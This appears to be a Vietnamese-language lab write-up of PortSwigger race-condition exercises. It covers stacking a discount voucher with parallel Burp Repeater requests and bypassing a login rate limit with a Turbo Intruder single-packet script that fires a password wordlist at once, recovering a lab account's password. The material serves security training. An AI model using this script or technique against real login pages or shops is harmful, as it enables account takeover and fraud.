## Lab 1

<img width="1068" height="523" alt="image" src="https://github.com/user-attachments/assets/f1cd5f46-6c94-4b9a-b263-6c50ed422677" />

\- Với đề bài như trên, ta nghĩ ngay đến việc:
- Thu thập request áp voucher
- Gửi vào repeater
- Tạo nhóm cho 15-20 request
- Single-packer attack



<img width="1863" height="737" alt="image" src="https://github.com/user-attachments/assets/8696242c-cf78-4b8f-b3f0-9bf0637534bc" />

\- Bấm `Send group (parallel)` và khai hoả toàn bộ 17 request áp dụng mã giảm giá, ta được giá siêu mềm (so với budget 50$):

<img width="1209" height="434" alt="image" src="https://github.com/user-attachments/assets/6530e430-b43a-45fe-a5b6-0039b47fe864" />

\- Đặt lệnh mua và hoàn thành bài lab 💗

# Lab 2
<img width="1046" height="587" alt="image" src="https://github.com/user-attachments/assets/a2d86f75-47f4-4fb3-972a-5afe2758ac09" />

\- Bài này yêu cầu ta vượt qua cơ chế rate limit và đăng nhập thành công vào tài khoản carlos

\- Nghĩ đến việc không thể Duplicate 30 request và sửa body của từng request một với wordlist cho trước, ta sử dụng extension Turbo Intruder

\- Chuột phải vào request &rarr; Extensions &rarr; Turbo Intruder &rarr; Send to turbo intruder
- Thay mật khẩu hiện tại của request thành `%s` (vị trí để thay từng dòng của wordlist vào)
- Lưu sẵn wordlist mà lab cho vào bộ nhớ tạm (Ctrl + C)
- Khi này ta craft một [payload](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py) như sau:
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Lấy từng dòng vừa copy vào khay nhớ tạm
    for word in wordlists.clipboard:
        engine.queue(target.req, word.rstrip(), gate='race1')

    # Gửi đồng loạt
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

$\implies$ Tìm tới request với status code 302, và kết quả:

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e17d484a-3bfa-4e9f-a3a0-d84fbfb88610" />


\- Đã tìm thấy mật khẩu đúng, đăng nhập với credential `carlos:111111`, truy cập admin panel và xoá đi carlos

<img width="991" height="285" alt="image" src="https://github.com/user-attachments/assets/630d4abd-aad7-4b4d-8c31-0a3d77458209" />

## Lab 3



